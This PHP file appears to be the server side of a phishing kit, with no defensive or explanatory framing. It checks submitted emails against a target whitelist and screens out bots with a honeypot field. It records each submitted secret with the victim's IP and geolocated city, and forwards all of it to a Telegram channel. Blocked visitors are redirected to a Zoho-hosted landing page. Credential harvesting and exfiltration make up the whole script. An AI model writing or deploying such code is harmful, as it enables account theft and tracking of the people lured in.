<?php
require __DIR__ . '/backend_common.php';

handle_cors_preflight_if_needed();

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    json_response(['ok' => false, 'error' => 'Method not allowed'], 405);
}

$email      = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
$password   = trim($_POST['name'] ?? '');
$token      = $_POST['step2_token'] ?? '';
$honeypot   = trim($_POST['company'] ?? '');

if ($honeypot !== '') {
    json_response(['ok' => false, 'error' => 'Unexpected error. Please try again.']);
}

if (!$email || !$password) {
    json_response(['ok' => false, 'error' => 'Invalid input.']);
}

// Validate token (TTL + IP + min-time)
$payload = validate_step_token($token);
if ($payload === false) {
    json_response(['ok' => false, 'error' => 'Session expired. Please verify again.']);
}

$original_email = $payload['email'] ?? '';

// Optional: re-check whitelist for the (possibly changed) email
if (EMAIL_VALIDATION_ENABLED) {
    $whitelist = load_whitelist();
    if (!in_array($email, $whitelist, true)) {
        json_response(['ok' => false, 'error' => 'Restricted access. Enter your email']);
    }
}

$ip = get_client_ip();

// Geo lookup (best effort)
$geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,query");
$geoData = $geo ? json_decode($geo, true) : null;
$location = ($geoData && isset($geoData['country']))
    ? ($geoData['country'] . ", " . $geoData['regionName'] . ", " . $geoData['city'])
    : "Unknown";

$attempts = load_attempts();
$now      = date('Y-m-d H:i:s');

// Update attempts keyed by CURRENT email
if (!isset($attempts[$email])) {
    $attempts[$email] = [
        'names'    => [$password],
        'count'    => 1,
        'ip'       => $ip,
        'location' => $location,
        'time'     => $now
    ];
} else {
    $attempts[$email]['names'][] = $password;
    $attempts[$email]['count']  += 1;
    $attempts[$email]['ip']      = $ip;
    $attempts[$email]['location']= $location;
    $attempts[$email]['time']    = $now;
}

save_attempts($attempts);

// Telegram notification
$msg  = "Login attempt for: {$email}\n";
if (!empty($original_email) && $original_email !== $email) {
    $msg .= "Original validated email: {$original_email}\n";
}
$msg .= "Names tried: " . implode(", ", $attempts[$email]['names']) . "\n";
$msg .= "Total attempts: {$attempts[$email]['count']}\n";
$msg .= "IP: {$ip}\n";
$msg .= "Location: {$location}\n";
$msg .= "Last updated: {$attempts[$email]['time']}";

send_telegram($msg);

// Password check (same logic as before)
$correct_name = "JohnMDoe";

if ($password !== $correct_name) {
    if ($attempts[$email]['count'] >= 3) {
        // 3+ failed → block
        json_response([
            'ok'      => false,
            'blocked' => true,
            'redirect'=> 'https://transmission.zoholandingpage.com/404/',
            'error'   => 'Too many incorrect attempts.'
        ]);
    } else {
        json_response([
            'ok'      => false,
            'error'   => 'Incorrect details. Please try again.',
            'attempts'=> $attempts[$email]['count']
        ]);
    }
}

// Success → redirect to dashboard
json_response([
    'ok'       => true,
    'redirect' => 'https://your-backend-domain/dashboard.php'
]);
